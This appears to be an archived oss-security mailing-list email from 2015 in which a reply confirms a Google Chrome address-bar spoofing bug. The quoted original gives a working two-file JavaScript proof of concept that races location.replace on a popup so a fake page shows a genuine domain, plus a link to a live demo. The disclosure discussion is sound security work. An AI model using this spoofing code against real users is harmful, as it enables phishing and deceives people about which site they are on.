X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1781" "Tuesday" "30" "June" "2015" "16:42:24" "+0000" "Big Whale" "d0lph1n98@yahoo.com" "<1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>" "68" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "6" "2015063016:42:24" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "        d0lph1n98@ya Jun 30   68/1781  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3287 invoked by uid 550); 1 Jul 2015 07:51:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 7552 invoked from network); 30 Jun 2015 16:42:49 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1435682556; bh=VDY8D2CKLy9w9EKKbBCVbFnc8bUOti6/nz6fKTUYAT0=; h=Date:From:Reply-To:To:In-Reply-To:References:Subject:From:Subject; b=g6YJcVdhoMUcNxrcblkq+ulghqYFlCksrNMblCMwgMgl6tdDIyKE1f07SMNzEknXmgF6NlKg68rQjXdVO4ZX+r/v35jBOnLls8A5uPHUp3UxR79IXsux83QhSo3Is+J5zaVt2Eg3YyPiSdp7AObxGsehqZfOwLX2go7oOxOwb+/yRMJbqAcLu2P+IKF0KeoUD2bl9tymhbv2uLCdbYphxMkCLE6QQzFL0+WoASiDtEH5QUpxdh/BkxTNXhXv6lZRafQl1A/+urSdUQYF+A5xD10Av/RqeSM1HDz+LHNlRTLBKW4Zyqd1MDPmfNxGv8jWLxnuSsbioW7DNxbeXn85KQ==
X-Yahoo-Newman-Property: ymail-3
X-Yahoo-Newman-Id: 541291.54158.bm@omp1053.mail.ne1.yahoo.com
X-YMail-OSG: fcVWMm0VM1kq7w3TQFa9Kv4LZsRuH9iwNE49SuDJWeCCxqaBUll1nRs602BMOji
 BH2p9RULuC9vV0oMqu1VLuFWAyFg.IF.3uPQ9o7GB7CsOZ68vivaCUmD.pW6cG7EQNPiUZMzjWKD
 SbZX2YXmfrRhqB_kB0QtqlBo4VngRUsz_sngm0PLhBsahlIpoYER9N9HRJK0A71i3aXs5jVAcMdI
 45ER0yhDHp6oP5c5MTg.0j3lHjpKdQER_eZGtECN2QJw.yAJQtJimuUgBOMUO3iBJ.rw0Gqibfei
 eoaROWSl8HVUszsAK5ebpF6Y8ydk3JdvX4P_Vhu3a0XiqdM8ZLGvw8hUj.T55zWIvvpqKWmz3WOz
 u5xticEPYB3INvkIt0_LEtj2n2zAjH8f.ysoqhidavulfg2iv2xCq9CBHA_wezMwswpSr9IzwNAm
 wq73MCBotfMKslaMCvQ3qbT9_WmZ7Byr2KkYABoerp4qVS8H4Co.tp.QIbeh21E5occ8-
Message-ID: <1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>
In-Reply-To: <55923253.8020902@deusen.co.uk>
References: <55923253.8020902@deusen.co.uk>
MIME-Version: 1.0
Content-Type: multipart/alternative; 
	boundary="----=_Part_2509180_399487137.1435682544577"
Date: Tue, 30 Jun 2015 16:42:24 +0000 (UTC)
From: Big Whale <d0lph1n98@yahoo.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)
To: David Leo <david.leo@deusen.co.uk>, 
	"bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, 
	"fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, 
	"oss-security@lists.openwall.com" <oss-security@lists.openwall.com>

------=_Part_2509180_399487137.1435682544577
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Tested on Google Chrome 43.0.2357.130 (64-bit) (Linux) and it works. I do n=
ot think it is some kind of DoS attack, it is clearly URL spoofing vulnerab=
ility. Perhaps, your report does not clarify the vulnerability precisely.=20


     On Tuesday, June 30, 2015 8:24 PM, David Leo <david.leo@deusen.co.uk> =
wrote:
=20=20=20

 Impact:
The "click to verify" thing is completely broken...
Anyone can be "BBB Accredited Business" etc.
You can make whitehouse.gov display "We love Islamic State" :-)

Note:
No user interaction on the fake page.

Code:
***** index.html
<script>
function next()
{
=C2=A0=C2=A0=C2=A0 w.location.replace('http://www.oracle.com/index.html?'+n=
);n++;
=C2=A0=C2=A0=C2=A0 setTimeout("next();",15);
=C2=A0=C2=A0=C2=A0 setTimeout("next();",25);
}
function f()
{
=C2=A0=C2=A0=C2=A0 w=3Dwindow.open("content.html","_blank","width=3D500 hei=
ght=3D500");
=C2=A0=C2=A0=C2=A0 i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clear=
Interval(i);n=3D0;next();}",5);
}
</script>
<a href=3D"#" onclick=3D"f()">Go</a><br>
***** content.html
<b>This web page is NOT oracle.com</b>
<script>location=3D"http://www.oracle.com/index.html";</script>
***** It's online
http://www.deusen.co.uk/items/gwhere.6128645971389012/
(The page says "June/16/2015" - it works as we tested today)

Request For Comment:
We reported this to Google.
They reproduced, and say
It's DoS which doesn't matter.
We think it's very strange,
since the browser does not crash(not DoS),
and the threat is obvious.
What's your opinion?

Kind Regards,

PS
We love clever tricks.
We love this:
http://dieyu.org/



=20=20=

------=_Part_2509180_399487137.1435682544577--
